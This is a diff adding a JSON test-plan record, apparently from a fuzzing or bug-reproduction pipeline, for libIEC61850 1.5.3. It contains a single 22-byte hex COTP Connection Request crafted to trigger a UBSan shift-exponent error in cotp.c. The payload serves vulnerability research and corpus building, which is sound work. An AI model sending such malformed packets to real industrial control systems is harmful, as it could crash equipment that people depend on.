@@ -1,0 +1,69 @@
+{
+  "plan_id": "vk-plan-065",
+  "seed_id": "589-2",
+  "title": "VK-only COTP Connection Request: In libIEC61850 version 1.5.3, sending the provided proof-of-concept...",
+  "strategy": "length_boundary_valid",
+  "target_operation": "COTP Connection Request",
+  "purpose": "Use a model-prior setup sequence for the issue-related state prerequisite.",
+  "evidence_ids": [
+    "issue:495:495-summary:292e0a30dc47",
+    "issue:368:368-summary:997e8d1338a8",
+    "issue:496:496-summary:0b725b37c953",
+    "issue:492:492-summary:b5a20a150fa2",
+    "issue:542:542-summary:a6cc05667747",
+    "issue:cve-2026-18583:cve-2026-18583-summa:3c0f8378f90e"
+  ],
+  "messages": [
+    {
+      "index": 0,
+      "direction": "client_to_server",
+      "label": "COTP Connection Request",
+      "hex": "0300001623e00000000100c1020000c2020001c001a2",
+      "byte_length": 22,
+      "sha256": "eb16771d7206641dfde51f52487202fa25e4f7ade6725d054acb795c0f193759"
+    }
+  ],
+  "expected_behavior": "Undefined behavior (shift exponent 162) in cotp.c:481, detected by UBSan as runtime error.",
+  "constraints_preserved": [
+    "TPKT version 0x03",
+    "TPKT total-length consistent with complete message",
+    "IEC61850 MMS over RFC1006 family constraints",
+    "single-request shape",
+    "message-budget=1",
+    "lowercase hex without separators",
+    "internally consistent visible lengths",
+    "distinct operation/structures",
+    "no exact crash-byte copies",
+    "model-internal prior"
+  ],
+  "issue_safety_notes": "Preserves safe analogue from issue 589 TPDU-size shift UB; no payload collisions; enforces built-in family constraints and family diversity.",
+  "sequence_sha256": "3f1c69190388b09f4d45b40d37249f1786e39d7dcba3638b58dd3f1cdef7643d",
+  "total_bytes": 22,
+  "message_count_hint": 1,
+  "repair_notes": [],
+  "exact_issue_collision": false,
+  "plan_issue_refs": [
+    "495"
+  ],
+  "_selection_score": 78.0,
+  "export": {
+    "sequence_encoding": "raw-binary-concat",
+    "sequence_file": "sequence.bin",
+    "encoded_sha256": "eb16771d7206641dfde51f52487202fa25e4f7ade6725d054acb795c0f193759",
+    "encoded_bytes": 22,
+    "frames": [
+      {
+        "message_index": 0,
+        "frame_offset": 0,
+        "payload_offset": 0,
+        "payload_length": 22,
+        "frame_length": 22
+      }
+    ],
+    "filesystem_naming": {
+      "sequence_directory": "039-589-2-7a0a484c",
+      "corpus_file": "039-7a0a484c.bin",
+      "policy": "short-hash-names-for-windows-path-safety"
+    }
+  }
+}
